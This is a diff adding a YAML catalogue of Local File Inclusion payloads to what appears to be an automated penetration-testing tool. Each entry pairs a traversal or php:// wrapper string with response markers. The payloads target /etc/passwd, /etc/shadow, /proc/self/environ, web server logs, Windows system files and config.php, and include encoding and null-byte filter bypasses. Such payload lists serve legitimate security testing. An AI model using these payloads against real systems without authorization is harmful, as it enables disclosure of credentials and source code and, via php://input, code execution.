@@ -1,0 +1,237 @@
+# Curated Local File Inclusion payloads for authorized security testing.
+#
+# Each entry:
+#   id:               stable identifier
+#   category:         unix | windows | bypass | php-wrapper | absolute
+#   family:           one of LfiTargetFamily (unix_passwd, unix_hosts,
+#                     unix_shadow, win_hosts, win_ini, proc_self, log_file,
+#                     code_leak). Drives which detector in
+#                     penage.specialists.shared.path_traversal is expected
+#                     to fire.
+#   depth:            number of ../ segments in the payload (0 for absolute
+#                     paths and php:// wrappers that target an absolute name).
+#   payload:          raw injection string sent as the vulnerable parameter.
+#   expected_markers: list of substrings the specialist looks for in the
+#                     response body to treat the probe as verified. May be
+#                     empty when the detector uses structural regexes rather
+#                     than fixed substrings (e.g. proc/self/cmdline, php://
+#                     filter base64 leaks).
+#   notes:            short human-facing rationale.
+#
+# SECURITY: LFI is strictly read-only disclosure. No payload here modifies,
+# writes, or deletes. Any future addition that could perform a write (e.g.
+# php://filter/write=... or data://) must be gated behind an explicit opt-in
+# flag per CLAUDE.md invariant #4.
+
+# --- unix ---
+- id: lfi-unix-passwd-depth3
+  category: unix
+  family: unix_passwd
+  depth: 3
+  payload: "../../../etc/passwd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Classic /etc/passwd disclosure at depth 3; covers webroots close to filesystem root."
+
+- id: lfi-unix-passwd-depth5
+  category: unix
+  family: unix_passwd
+  depth: 5
+  payload: "../../../../../etc/passwd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Deeper /etc/passwd traversal for webroots nested 3-5 levels below the include."
+
+- id: lfi-unix-passwd-depth7
+  category: unix
+  family: unix_passwd
+  depth: 7
+  payload: "../../../../../../../etc/passwd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Maximum-safe /etc/passwd traversal; excess ../ is collapsed by the OS, so deeper is harmless."
+
+- id: lfi-unix-hosts
+  category: unix
+  family: unix_hosts
+  depth: 5
+  payload: "../../../../../etc/hosts"
+  expected_markers: ["127.0.0.1", "localhost"]
+  notes: "/etc/hosts is world-readable; low-risk canary to confirm traversal works at all."
+
+- id: lfi-unix-shadow
+  category: unix
+  family: unix_shadow
+  depth: 6
+  payload: "../../../../../../etc/shadow"
+  expected_markers: ["root:$"]
+  notes: "/etc/shadow requires root-level read; a hit implies LFI + privileged process (escalate cautiously)."
+
+- id: lfi-proc-self-environ
+  category: unix
+  family: proc_self
+  depth: 5
+  payload: "../../../../../proc/self/environ"
+  expected_markers: ["PATH=", "HOME="]
+  notes: "Environment of the web process; high-value for token/credential leakage via env vars."
+
+- id: lfi-proc-self-status
+  category: unix
+  family: proc_self
+  depth: 5
+  payload: "../../../../../proc/self/status"
+  expected_markers: ["Name:", "State:"]
+  notes: "Process status tab; discloses UID/GID and confirms traversal reaches /proc."
+
+- id: lfi-proc-self-cmdline
+  category: unix
+  family: proc_self
+  depth: 5
+  payload: "../../../../../proc/self/cmdline"
+  expected_markers: []
+  notes: "Process cmdline (NUL-separated argv); useful for interpreter fingerprint. Markers vary."
+
+- id: lfi-log-apache-access
+  category: unix
+  family: log_file
+  depth: 5
+  payload: "../../../../../var/log/apache2/access.log"
+  expected_markers: ["HTTP/1.1"]
+  notes: "Apache common log format; classic log-poisoning precursor when paired with a tainted UA."
+
+- id: lfi-log-nginx-access
+  category: unix
+  family: log_file
+  depth: 5
+  payload: "../../../../../var/log/nginx/access.log"
+  expected_markers: ["HTTP/1.1"]
+  notes: "Nginx access log; identical shape to Apache, different path."
+
+# --- windows ---
+- id: lfi-win-ini-depth3
+  category: windows
+  family: win_ini
+  depth: 3
+  payload: "../../../Windows/win.ini"
+  expected_markers: ["[fonts]", "[extensions]"]
+  notes: "win.ini at depth 3 using forward slashes, which Windows I/O tolerates for most APIs."
+
+- id: lfi-win-ini-depth6
+  category: windows
+  family: win_ini
+  depth: 6
+  payload: "../../../../../../Windows/win.ini"
+  expected_markers: ["[fonts]", "[extensions]"]
+  notes: "Deeper win.ini traversal for applications running below multiple nested directories."
+
+- id: lfi-win-hosts
+  category: windows
+  family: win_hosts
+  depth: 5
+  payload: "../../../../../Windows/System32/drivers/etc/hosts"
+  expected_markers: ["127.0.0.1", "Microsoft"]
+  notes: "Windows hosts file; distinguished from Unix hosts by the Microsoft Corp. header comments."
+
+- id: lfi-win-boot-ini
+  category: windows
+  family: win_ini
+  depth: 3
+  payload: "../../../boot.ini"
+  expected_markers: ["[boot loader]"]
+  notes: "Legacy Windows XP/Server 2003 boot.ini; rare today but trivial and high-confidence when present."
+
+# --- bypass ---
+- id: lfi-bypass-urlenc-passwd
+  category: bypass
+  family: unix_passwd
+  depth: 5
+  payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "URL-encoded dots and slashes; bypasses filters that pattern-match raw ../ before decoding."
+
+- id: lfi-bypass-double-urlenc-passwd
+  category: bypass
+  family: unix_passwd
+  depth: 5
+  payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Double URL encoding; bypasses filters that decode once and then validate the single-decoded form."
+
+- id: lfi-bypass-doubledot-doubleslash-passwd
+  category: bypass
+  family: unix_passwd
+  depth: 5
+  payload: "....//....//....//....//....//etc/passwd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "....// evader: filters that strip one ../ from the middle leave a valid ../ in the residue."
+
+- id: lfi-bypass-nullbyte-jpg-passwd
+  category: bypass
+  family: unix_passwd
+  depth: 5
+  payload: "../../../../../etc/passwd%00.jpg"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Null-byte + fake extension; works on PHP < 5.3.4 where %00 truncates the filename."
+
+- id: lfi-bypass-mixed-slash-winini
+  category: bypass
+  family: win_ini
+  depth: 3
+  payload: ".\\./.\\./.\\./Windows/win.ini"
+  expected_markers: ["[fonts]", "[extensions]"]
+  notes: "Mixed dot-backslash traversal; evades regex filters keyed strictly on ../ or ..\\."
+
+- id: lfi-bypass-backslash-win-hosts
+  category: bypass
+  family: win_hosts
+  depth: 5
+  payload: "..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
+  expected_markers: ["127.0.0.1", "Microsoft"]
+  notes: "Pure backslash traversal to Windows hosts; covers filters that only normalise forward slashes."
+
+# --- php-wrapper ---
+- id: lfi-php-filter-index-d3
+  category: php-wrapper
+  family: code_leak
+  depth: 3
+  payload: "php://filter/convert.base64-encode/resource=../../../index.php"
+  expected_markers: []
+  notes: "Base64-leaks index.php source; verify via detect_lfi_markers code_leak branch (PHP-token heuristic)."
+
+- id: lfi-php-filter-index-d5
+  category: php-wrapper
+  family: code_leak
+  depth: 5
+  payload: "php://filter/convert.base64-encode/resource=../../../../../index.php"
+  expected_markers: []
+  notes: "Deeper php://filter source disclosure for nested webroots."
+
+- id: lfi-php-filter-config-d5
+  category: php-wrapper
+  family: code_leak
+  depth: 5
+  payload: "php://filter/convert.base64-encode/resource=../../../../../config.php"
+  expected_markers: []
+  notes: "Base64-leaks config.php; top source of DB creds when PHP apps expose an LFI sink."
+
+- id: lfi-php-input-stub
+  category: php-wrapper
+  family: code_leak
+  depth: 0
+  payload: "php://input"
+  expected_markers: []
+  notes: "POST-only: request body becomes include() content. Requires the caller to set a POST body with <?php ... ?>."
+
+# --- absolute ---
+- id: lfi-abs-unix-passwd
+  category: absolute
+  family: unix_passwd
+  depth: 0
+  payload: "/etc/passwd"
+  expected_markers: ["root:x:0:0:"]
+  notes: "Absolute path; works when the application concatenates input without a fixed directory prefix."
+
+- id: lfi-abs-win-ini
+  category: absolute
+  family: win_ini
+  depth: 0
+  payload: "C:\\Windows\\win.ini"
+  expected_markers: ["[fonts]", "[extensions]"]
+  notes: "Absolute Windows path with drive letter; same rationale as the Unix absolute probe."
